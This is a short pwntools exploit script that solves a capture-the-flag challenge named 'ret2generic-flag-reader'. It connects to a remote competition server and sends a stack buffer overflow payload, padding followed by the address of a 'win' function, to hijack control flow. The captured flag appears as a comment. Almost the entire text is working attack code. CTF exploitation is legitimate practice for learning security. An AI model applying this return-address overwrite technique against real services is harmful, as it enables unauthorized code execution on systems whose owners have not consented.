from pwn import *
elf = ELF("./ret2generic-flag-reader")
#p = process("./ret2generic-flag-reader")
#gdb.attach("ret2generic-flag-reader")
host, port = 'mc.ax', 31077
p = remote(host,port)

win = 0x00000000004011f6
exp = "A"*0x20+p64(1)+p64(win)

p.sendline(exp)
p.interactive()
#flag{rob-loved-the-challenge-but-im-still-paid-minimum-wage}

